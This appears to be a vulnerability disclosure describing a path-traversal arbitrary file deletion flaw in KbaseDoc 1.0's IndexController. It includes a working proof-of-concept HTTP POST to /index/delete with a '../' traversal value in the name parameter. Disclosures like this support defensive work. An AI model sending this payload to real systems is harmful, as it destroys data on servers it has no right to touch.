**[KbaseDoc V1.0 has an arbitrary file deletion vulnerability](https://github.com/ekoz/kbase-doc)**
---
### Description:
---

Kbase doc has an arbitrary file deletion vulnerability in ```src/main/java/com/eastrobot/doc/web/IndexController.java```

Source code download address: ```https://github.com/ekoz/kbase-doc```

Version: ```1.0```

### Vulnerability analysis:
---
Locate the location where the vulnerability exists:
```src/main/java/com/eastrobot/doc/web/IndexController.java```
![image](https://user-images.githubusercontent.com/101170679/200874276-20244612-f997-458a-a7e5-93654f654d7d.png)

The POST request gets the name parameter,Since there is no filtering,As a result, parameters such as ```../``` can be spliced,Causes directory traversal,Because deletion is involved,Resulting in arbitrary file deletion vulnerability.

### Recurrence of vulnerability
---
**[Download the source code and build the local environment](https://github.com/ekoz/kbase-doc)**

Create a ```poc.txt``` file in the ```kbase-doc-master\target\classes``` directory .

![image](https://user-images.githubusercontent.com/101170679/200877500-02791bac-8d58-4062-953c-6b4e1b62d78e.png)

Use burpsuite to construct the following request.

![image](https://user-images.githubusercontent.com/101170679/200877728-8f3b8cf3-361d-41d0-b425-f5b8a777e857.png)

[+] POC:

```
POST /index/delete HTTP/1.1
Host: test:8081
Content-Length: 22
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: chrome-extension://coohjcphdfgbiolnekdpbcijmhambjff
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie:__utma=71411734.247469081.1654064241.1654064241.1654064241.1; __utmz=71411734.1654064241.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)
Connection: close

name=..%2F..%2Fpoc.txt

```

It is found that poc.txt is deleted.

![image](https://user-images.githubusercontent.com/101170679/200878874-b6af7fd5-e44a-423b-b5ba-7de013b563df.png)

### Proof and Exploit:
---
[href](https://streamable.com/ll4yxe)
